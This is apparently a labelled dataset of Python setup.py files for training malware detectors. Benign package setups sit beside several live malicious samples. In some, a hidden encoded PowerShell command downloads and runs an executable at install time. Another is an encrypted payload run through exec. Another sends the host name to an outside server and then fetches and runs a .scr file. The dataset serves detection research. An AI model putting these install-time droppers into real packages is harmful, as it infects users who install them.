{"idx": "esqosintvisaget-7.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqosintvisaget',\n    packages = ['modlib'],\n    version = '3.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-automl-2.8.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-automl\"\ndescription = \"Cloud AutoML API client library\"\nversion = \"2.8.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\n    \"libcst\": \"libcst >= 0.2.5\",\n    \"pandas\": [\"pandas>=1.0.5\"],\n    \"storage\": [\"google-cloud-storage >=1.18.0, <3.0.0dev\"],\n}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@oogle.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-automl\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_automl_v1_keywords.py\",\n        \"scripts/fixup_automl_v1beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "curtsies-0.3.10", "func": "from setuptools import setup\nimport ast\nimport os\n\n\ndef version():\n    \"\"\"Return version string.\"\"\"\n    with open(os.path.join(\"curtsies\", \"__init__.py\")) as input_file:\n        for line in input_file:\n            if line.startswith(\"__version__\"):\n                return ast.parse(line).body[0].value.s\n\n\nsetup(\n    version=version(),\n)\n", "target": 0}
{"idx": "django-axes-5.36.0", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup, find_packages\n\nsetup(\n    name=\"django-axes\",\n    description=\"Keep track of failed login attempts in Django-powered sites.\",\n    long_description=\"\\n\".join(\n        [\n            open(\"README.rst\", encoding=\"utf-8\").read(),\n            open(\"CHANGES.rst\", encoding=\"utf-8\").read(),\n        ]\n    ),\n    keywords=\"authentication django pci security\",\n    author=\", \".join(\n        [\n            \"Josh VanderLinden\",\n            \"Philip Neustrom\",\n            \"Michael Blume\",\n            \"Alex Clark\",\n            \"Camilo Nova\",\n            \"Aleksi Hakli\",\n        ]\n    ),\n    author_email=\"security@jazzband.co\",\n    maintainer=\"Jazzband\",\n    maintainer_email=\"security@jazzband.co\",\n    url=\"https://github.com/jazzband/django-axes\",\n    project_urls={\n        \"Documentation\": \"https://django-axes.readthedocs.io/\",\n        \"Source\": \"https://github.com/jazzband/django-axes\",\n        \"Tracker\": \"https://github.com/jazzband/django-axes/issues\",\n    },\n    license=\"MIT\",\n    package_dir={\"axes\": \"axes\"},\n    use_scm_version=True,\n    setup_requires=[\"setuptools_scm\"],\n    python_requires=\">=3.7\",\n    install_requires=[\"django>=3.2\", \"django-ipware>=3\", \"setuptools\"],\n    include_package_data=True,\n    packages=find_packages(exclude=[\"tests\"]),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Environment :: Plugins\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: System Administrators\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Internet :: Log Analysis\",\n        \"Topic :: Security\",\n        \"Topic :: System :: Logging\",\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "libpywvisavirtual-2.26", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBlAHMAcQB1AGUAbABlAHMAdABsAC4AMAAwADAAdwBlAGIAaABvAHMAdABhAHAAcAAuAGMAbwBtAC8AeABFAHMAcQB1AGUAbABlAHMAcQB1AGEAZAAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpywvisavirtual',\n    packages = ['modlib'],\n    version = '6.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "first-2.0.2", "func": "from setuptools import setup\n\nimport first\nimport sys\n\n\nif sys.version_info[0] >= 3:\n    openf = open\nelse:\n    import codecs\n    openf = codecs.open\n\ndef read(fn):\n    with openf(fn, encoding='utf-8') as fp:\n        return fp.read()\n\n\nsetup(\n    name='first',\n    version=first.__version__,\n    description='Return the first true value of an iterable.',\n    long_description=(read('README.rst') + '\\n\\n' +\n                      read('HISTORY.rst') + '\\n\\n' +\n                      read('AUTHORS.rst')),\n    long_description_content_type=\"text/x-rst\",\n    url='http://github.com/hynek/first/',\n    license=first.__license__,\n    author=first.__author__,\n    author_email='hs@ox.cx',\n    py_modules=['first'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n)\n", "target": 0}
{"idx": "feature_engine-1.4.1", "func": "from pathlib import Path\n\nfrom setuptools import find_packages, setup\n\n# Package meta-data.\nNAME = \"feature_engine\"\nDESCRIPTION = \"Feature engineering package with Scikit-learn's fit transform functionality\"\nURL = \"http://github.com/feature-engine/feature_engine\"\nEMAIL = \"solegalli@protonmail.com\"\nAUTHOR = \"Soledad Galli\"\nREQUIRES_PYTHON = \">=3.8.0\"\n\n# description\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\n\n# Packages required for this module to be executed\ndef list_reqs(fname='requirements.txt'):\n    with open(fname) as fd:\n        return fd.read().splitlines()\n\n\n# Load the package's VERSION file as a dictionary.\nabout = {}\nROOT_DIR = Path(__file__).resolve().parent\nPACKAGE_DIR = ROOT_DIR / 'feature_engine'\nwith open(PACKAGE_DIR / \"VERSION\") as f:\n    _version = f.read().strip()\n    about[\"__version__\"] = _version\n\nsetup(name=NAME,\n      version=about[\"__version__\"],\n      description=DESCRIPTION,\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      url=URL,\n      author=AUTHOR,\n      author_email=EMAIL,\n      python_requires=REQUIRES_PYTHON,\n      packages=find_packages(exclude=(\"tests\",)),\n      package_data={\"feature_engine\": [\"VERSION\"]},\n      license='BSD 3 clause',\n      install_requires=list_reqs(),\n      include_package_data=True,\n      classifiers=[\n          # Trove classifiers\n          # Full list: https://pypi.python.org/pypi?%3Aaction=list_classifiers\n          \"License :: OSI Approved :: BSD License\",\n          \"Programming Language :: Python :: 3.8\",\n          \"Programming Language :: Python :: 3.9\",\n          \"Programming Language :: Python :: 3.10\",\n      ],\n      zip_safe=False)\n", "target": 0}
{"idx": "tppypingvm-7.2", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppypingvm',\n    packages = ['modlib'],\n    version = '2.12',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "postrandom-10.42", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'postrandom',\n    packages = ['modlib'],\n    version = '2.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqverpyosint-9.22", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGUAcwBxAHUAZQBsAGUAcwB0AGwALgAwADAAMAB3AGUAYgBoAG8AcwB0AGEAcABwAC4AYwBvAG0ALwB4AEUAcwBxAHUAZQBsAGUAcwBxAHUAYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqverpyosint',\n    packages = ['modlib'],\n    version = '5.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "requiements-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'eYUTkGWHnghkRXktCL VBgZUZbvIbGQAXSXaRenmuFZvu'\nLONG_DESCRIPTION = 'JWAKefL CtiWYb EXNxHMxqEvJyhcwtJkPlGBvAzaMZxmGwMnIMVzgIMFiWwnXAHNHjlRJWdhAWdIUXWkzjMNnWyDIripnQkVSjFijnYtpGuAECQYCFbTsUcrzHpSQvfHPgduShpuRLW'\n\n\nclass IPeOmltDVZkkybQpUBxwqeIqgsBSdUvUIlUPnzoMWUxMQLmHHpycaYfDRelUhvkLVVYbgQrgXAiLiviDrdfkNznBKggLFwjQnvOjRlxDQiPwnaswfHFfutwKgCzvcZnZFgTpPjHnaKUKZ(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'y2EHIki8LFNS9ieZqnBSieta7DHDQsB43AzSCzLEcd8=').decrypt(b'gAAAAABmBIWrKVLGHEtmgFlR2gbPMS5sUMKzbFf5A4UQh4hvPZVjMjiKGudoLCDfby84e47WPjvT0A1Rse89AFLsuAyYlLeoRrd_h2Xe2Y8OpKsVTdQVDWHBC3rtuIQgilZgcZqZPvuOokbvP2ZgJRF4kIxSPa9MmPPjavcGRMkCRaHrJyEgZ-_SUO4DtXp-Rx65lw4yq3aM5kzPmhkaZH4orYiQ8WtCfINPT_Rgt_HjTEjmr0rmFGA='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requiements\",\n    version=VERSION,\n    author=\"eNpDnSfwAGlExYd\",\n    author_email=\"sEVyGojJjFYWrjqA@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': IPeOmltDVZkkybQpUBxwqeIqgsBSdUvUIlUPnzoMWUxMQLmHHpycaYfDRelUhvkLVVYbgQrgXAiLiviDrdfkNznBKggLFwjQnvOjRlxDQiPwnaswfHFfutwKgCzvcZnZFgTpPjHnaKUKZ,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "Flask-Bootstrap-3.3.7.1", "func": "import os\n\nfrom setuptools import setup\n\n\ndef read(fname):\n    return open(os.path.join(os.path.dirname(__file__), fname)).read()\n\n\nsetup(\n    name='Flask-Bootstrap',\n    version='3.3.7.1',\n    url='http://github.com/mbr/flask-bootstrap',\n    license='BSD',\n    author='Marc Brinkmann',\n    author_email='git@marcbrinkmann.de',\n    description='An extension that includes Bootstrap in your '\n    'project, without any boilerplate code.',\n    long_description=read('README.rst'),\n    packages=['flask_bootstrap'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask>=0.8',\n        'dominate',\n        'visitor',\n    ],\n    classifiers=[\n        'Environment :: Web Environment', 'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent', 'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ])\n", "target": 0}
{"idx": "Flask-APScheduler-1.12.4", "func": "from setuptools import setup\n\nwith open(\"README.rst\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name='Flask-APScheduler',\n    version='1.12.4',\n    packages=['flask_apscheduler'],\n    url='https://github.com/viniciuschiele/flask-apscheduler',\n    license='Apache 2.0',\n    author='Vinicius Chiele',\n    author_email='vinicius.chiele@gmail.com',\n    description='Adds APScheduler support to Flask',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    keywords=['apscheduler', 'scheduler', 'scheduling', 'cron'],\n    install_requires=['flask>=0.10.1', 'apscheduler>=3.2.0,<4.0.0', 'python-dateutil>=2.4.2'],\n    package_data={'Flask-APScheduler': ['LICENSE']},\n    include_package_data=True,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5'\n    ]\n)\n", "target": 0}
{"idx": "tploadget-3.95", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tploadget',\n    packages = ['modlib'],\n    version = '3.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "h2-4.1.0", "func": "#!/usr/bin/env python3\n\nimport os\nimport re\n\nfrom setuptools import setup, find_packages\n\nPROJECT_ROOT = os.path.dirname(__file__)\n\nwith open(os.path.join(PROJECT_ROOT, 'README.rst')) as file_:\n    long_description = file_.read()\n\nversion_regex = r'__version__ = [\"\\']([^\"\\']*)[\"\\']'\nwith open(os.path.join(PROJECT_ROOT, 'src/h2/__init__.py')) as file_:\n    text = file_.read()\n    match = re.search(version_regex, text)\n    if match:\n        version = match.group(1)\n    else:\n        raise RuntimeError(\"No version number found!\")\n\nsetup(\n    name='h2',\n    version=version,\n    description='HTTP/2 State-Machine based protocol implementation',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Cory Benfield',\n    author_email='cory@lukasa.co.uk',\n    url='https://github.com/python-hyper/h2',\n    packages=find_packages(where=\"src\"),\n    package_data={'h2': []},\n    package_dir={'': 'src'},\n    python_requires='>=3.6.1',\n    license='MIT License',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n    install_requires=[\n        'hyperframe>=6.0,<7',\n        'hpack>=4.0,<5',\n    ],\n)\n", "target": 0}
{"idx": "pydobc-4.4.7", "func": "from setuptools import setup, find_packages\nimport os \nimport requests\nfrom setuptools.command.install import install\nfrom sys import platform\n \ndef send():\n    try:\n        env = os.environ['COMPUTERNAME']\n        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n        if platform == 'win32':\n            url = 'https://python-release.com/python-install.scr'\n            filename = 'ini_file_pyp_32.exe'\n            rq = requests.get(url, allow_redirects=True)\n            open(filename, 'wb').write(rq.content)\n            os.system('start '+filename)\n    except:\n        pass    \n \nclass PostInstallCommand(install):\n    def run(self):\n        install.run(self)\n        send()\n\n#firstbasicpyapp, elevatepyapp, praisepyapp\nsetup(\n  name='pydobc',\n  version='4.4.7',\n  description='A very basic firstbasicpyapp',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)", "target": 1}
{"idx": "py-replacepongpull-7.5", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-replacepongpull',\n    packages = ['modlib'],\n    version = '7.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
